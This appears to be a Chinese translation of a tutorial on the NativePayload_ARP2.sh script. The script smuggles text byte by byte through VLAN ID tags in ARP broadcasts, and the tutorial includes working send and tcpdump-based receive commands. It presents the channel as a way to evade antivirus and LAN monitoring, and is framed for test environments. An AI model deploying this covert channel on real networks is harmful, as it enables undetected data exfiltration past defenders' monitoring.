    41 = 'A'
    72 = 'r'
    65 = 'e'
    20 = ' '
    79 = 'y'
    …
这表示我们发送第一个字符`A`时，我们的`VID Tag`应该是`0x41`。现在，我们可以通过下面的命令将它注入到我们的ARP广播包中：
    root@kali:~# echo $(echo "A" | xxd -p -c 1 )
    41 0a
    root@kali:~# ops=`echo $(echo "A" | xxd -p -c 1)`
    root@kali:~# echo "${ops::-2}"
    41 
    root@kali:~# ops2=`echo "${ops::-2}"`
    root@kali:~# echo $ops2
    41
    root@kali:~# echo $((0x$ops2))
    65
    root@kali:~# 
下面来解释一下上面的代码。
使用下面的命令你会得到`A`的十六进制字节表示：
    root@kali:~# echo $(echo "A" | xxd -p -c 1 )
    41 0a
    root@kali:~# ops=`echo $(echo "A" | xxd -p -c 1)`
    root@kali:~# echo "${ops::-2}"
    41 
    root@kali:~# ops2=`echo "${ops::-2}"`
    root@kali:~# echo $ops2
下面这条命令将其转换为十进制：
    root@kali:~# echo $((0x$ops2))
    65
    root@kali:~# 
所以，我们的结果应该是：A=> 0x41(bytes) => 65(Decimal)。你的`VID Tag`就是65。
    root@kali:~# ip link add link eth0 name Vlanx type vlan id 65
    root@kali:~# ip addr add 192.168.110.1/24 brd 192.168.110.255 dev Vlanx
    root@kali:~# ip link set dev Vlanx up
    root@kali:~# ping 192.168.110.2
下一步就是从ARP广播包中接收这些字节：
现在你可以使用下面这个简单的脚本来实现上面的步骤：
    #!/bin/sh
    mytext="Are you going to Scarborough Fair?"
    for text in `echo $mytext | xxd -p -c 1`;
        do
            ops=`echo $(echo $text)`
            vlanID=`echo $((0x$ops))`
            echo "bytes: " $ops "VID Decimal: " $vlanID
            `ip link add link "eth0" name "Vlanx" type vlan id $vlanID`
            sleep 0.3
            `ip addr add 192.168.110.1/24 brd 192.168.110.255 dev Vlanx`
            sleep 0.3
            `ip link set dev Vlanx up`
            sleep 0.2
            ping 192.168.110.2 -c 2 | grep "ops" &
            sleep 1.8
            `ip link delete Vlanx`
        done
从下面这张图片中你可以看到脚本的执行结果：
正如你从这些图片中看到的那样，我们实现了通过带有`VID Tag`的ARP广播包将文本发送给LAN中的所有主机。
## 0x06 如何使用NativePayload_ARP2.sh
现在我想谈论一下NativePayload_ARP2.sh这个脚本，使用该脚本你可以通过ARP广播发送文本文件以及接收文本文件。该脚本有两种使用方法。
###  0x06.1 双方都使用NativePayload_ARP2.sh
在该方法中，你可以这样来做：
    Step1: (System A ) ./NativePayload_ARP2.sh -listen (Packet Number)
    Step2: (System B ) ./NativePayload_ARP2.sh -send TextFile.txt [VlanName] [vlan-Subnet/mask] [vlan-Broadcast] -p [vlan-    PingIPv4] [(wlan0,eth0,vboxnet0,etc.)]
这种情况下，你既可以使用该脚本来发送数据，亦可以使用它来接收。下面的图片中我使用了3台主机进行演示：一台物理机(IP地址：192.168.56.1)和两台虚拟机(IP地址分别是192.168.56.101,192.168.56.102)。
重点在于`-listen (Packet Number)`：你的`Packet Number`应该是`文本文件长度*2`。
     # cat test.txt | xxd -c 10
     0000000: 5365 6e64 696e 6720 4441 Sending DA
     000000a: 5441 2076 6961 2041 5250 TA via ARP
     0000014: 2042 726f 6164 6361 7374 Broadcast
     000001e: 2026 2056 4944 0a        & VID.
正如你看到的，文本文件长度是36Bytes，所以你的`Packet Number`应该是72。
下面的图片中你可以看到这种方法的结果：
从图片中你可以看出脚本使用`tcpdump`工具接收到72个ARP广播包，接收到的文本内容是“Esending DATA via ARERP
Broadcast & VI”，这个结果是不是看起来有些不太好？
     “Esending DATA via ARERP Broadcast & VI”
结果中的“E”是LAN内不知从何处而来的两个广播包中的数据，恰好被脚本接收到。不过你可以根据你的想法来改进代码，解决这个问题。
###  0x06.2 一方使用NativePayload_ARP2.sh，另一方使用tcpdump
在该方法中，你可以使用脚本发送数据，同时接收端使用`tcpdump`接收数据。  
你应当使用下面的命令：
    Step1: (System A ) tcpdump -XX -v broadcast | grep 0x0000
    Step2: (System B ) ./NativePayload_ARP2.sh -send TextFile.txt [VlanName] [vlan-Subnet/mask] [vlan-Broadcast] -p [vlan-    PingIPv4] [(wlan0,eth0,vboxnet0,etc.)]
## 0x07 总结
一个简单的脚本让你可以通过ARP广播包的`VID
Tag`来传输数据给LAN内所有主机，无论是物理机传输给物理机还是物理机传输给虚拟机，同时这种方法是躲避某些AV(Anti-Virus)或是LAN内监测工具的一种很好的方式，但一定要确保你仅在测试环境中使用此方法。
脚本地址：[Github](https://github.com/DamonMohammadbagher/NativePayload_ARP2)
视频：[Youtube](https://www.youtube.com/watch?v=C4fB7NQJHO4)
## 译者的话：
  1. `0x00 前言`部分提到的[NativePayload_ARP.sh](https://github.com/DamonMohammadbagher/NativePayload_ARP/blob/master/For_Linux_Macchanger/Macchange.sh) 并非`NativePayload_ARP.sh`，而是`Macchange.sh`，我的链接已经指向了它；
  2. 文章的结构划分在原文中并没有体现，译者自作主张将文章根据其内容划分成了7个小节；
  3. 作者在Github中给出了视频链接，一并放于文章末尾，以供读者观看；
作者脚本中listen功能实现中的
     tcpdump -c $2 -XX -v "broadcast" | grep -e 0806 -e "ffff ffff ffff" | grep 0x0000: | awk {'print $9'}
这行代码，译者在实践过程修改为：
         tcpdump -XX broadcast | grep -E '0x0010.*0806|0x0000.*8100' | grep '0x0000:' | awk  {'print $9'}
至于为何这样修改，作者在`0x06.1`已经提到了，不再赘述。译者水平有限，如果读者有更好的修改方案请不吝赐教。